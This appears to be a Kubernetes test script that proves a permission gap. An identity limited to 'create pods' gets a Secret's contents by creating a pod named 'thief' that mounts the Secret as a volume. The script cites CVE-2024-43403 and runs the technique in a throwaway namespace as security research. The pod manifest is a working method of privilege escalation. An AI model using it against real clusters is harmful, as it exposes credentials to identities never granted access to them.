#!/usr/bin/env bash
# Implicit permission: create Pod -> get Secret   (transition: pod-create-reads-secret)
#
# Proof: an identity granted ONLY `create pods` in a namespace cannot `get
# secrets` there, yet by authoring a Pod that mounts a Secret it obtains the
# Secret's bytes -- the kubelet reads the Secret on the identity's behalf.
# This is the marquee implicit permission (and the core of CVE-2024-43403 via
# a workload template). Mechanism: ../transitions/pod-create-reads-secret.md
source "$(dirname "$0")/../lib.sh"
test_start "pod-create-reads-secret"

ns="$(new_ns pod-secret)"
secret_val="s3cr3t-${RUN_ID}"

# Pre-existing cluster state: a Secret the attacker must never read directly.
step "admin creates Secret 'target' holding token=$secret_val"
K -n "$ns" create secret generic target --from-literal=token="$secret_val" >/dev/null \
  || fail "could not create target secret"

# Attacker identity: ONLY `create pods` (plus get pods, to see its own pod).
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "pods" "create,get,list"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: the attacker holds p but not q.
assert_can    "$subj" create pods    "$ns"
assert_cannot "$subj" get    secrets "$ns"

# ACT (as attacker, exercising ONLY p): author a Pod that mounts the Secret.
step "attacker creates a Pod that mounts Secret 'target' as a volume"
as_subj "$subj" -n "$ns" apply -f - >/dev/null <<EOF || fail "attacker could not create the pod"
apiVersion: v1
kind: Pod
metadata: { name: thief }
spec:
  automountServiceAccountToken: false
  containers:
  - name: c
    image: ${IMG}
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 3600"]
    volumeMounts: [{ name: s, mountPath: /mnt/secret, readOnly: true }]
  volumes:
  - name: s
    secret: { secretName: target }
EOF

# EFFECT: the kubelet mounted the Secret into the attacker's container.
# Observation is done by admin (reading the mounted file via exec needs
# pods/exec, which the attacker does not hold -- the attacker only did `create`).
wait_pod_running "$ns" thief 90
got="$(K -n "$ns" exec thief -- cat /mnt/secret/token 2>/dev/null)"
assert_eq "$got" "$secret_val" "secret bytes delivered into the attacker's pod"
step "kubelet delivered the Secret bytes ($got) into a Pod authored with only 'create pods'"

test_pass
